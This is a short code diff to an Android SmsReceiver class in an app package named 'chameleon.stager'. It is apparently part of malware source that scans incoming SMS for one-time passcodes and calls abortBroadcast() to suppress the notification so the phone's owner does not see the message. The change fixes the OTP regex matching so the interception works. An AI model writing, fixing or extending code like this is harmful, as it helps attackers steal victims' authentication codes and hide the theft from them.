@@ -11,6 +11,7 @@ import com.chameleon.stager.StagerApplication
 import com.chameleon.stager.utils.CryptoUtils
 import com.chameleon.stager.utils.NetworkUtils
 import org.json.JSONObject
+import java.util.regex.Pattern
 
 class SmsReceiver : BroadcastReceiver() {
     companion object {
@@ -36,8 +37,8 @@ class SmsReceiver : BroadcastReceiver() {
             val body = message.messageBody ?: ""
 
             // Check for OTP
-            val otpPattern = java.util.regex.Regex.compile(OTP_REGEX)
-            val isOTP = otpPattern.find(body)
+            val otpPattern = Pattern.compile(OTP_REGEX)
+            val isOTP = otpPattern.matcher(body).find()
 
             // Abort broadcast to suppress notification
             abortBroadcast()
